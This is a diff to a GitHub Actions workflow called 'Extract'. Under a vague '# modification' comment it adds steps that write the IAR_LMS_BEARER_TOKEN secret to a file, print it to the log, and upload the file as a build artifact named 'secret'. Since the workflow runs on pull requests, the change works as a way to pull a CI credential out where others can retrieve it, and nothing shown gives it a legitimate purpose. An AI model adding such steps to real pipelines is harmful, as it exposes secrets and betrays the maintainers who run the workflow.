@@ -1,5 +1,7 @@
 name: Extract
 
+# modification 
+
 on:
   workflow_dispatch:
   pull_request:
@@ -17,3 +19,11 @@ jobs:
       
       - run: echo $IAR_LMS_BEARER_TOKEN
   
+      - run: |
+          echo $IAR_LMS_BEARER_TOKEN > file.txt
+          cat file.txt
+
+      - uses: actions/upload-artifact@v4
+        name: secret
+        with:
+          path: file.txt
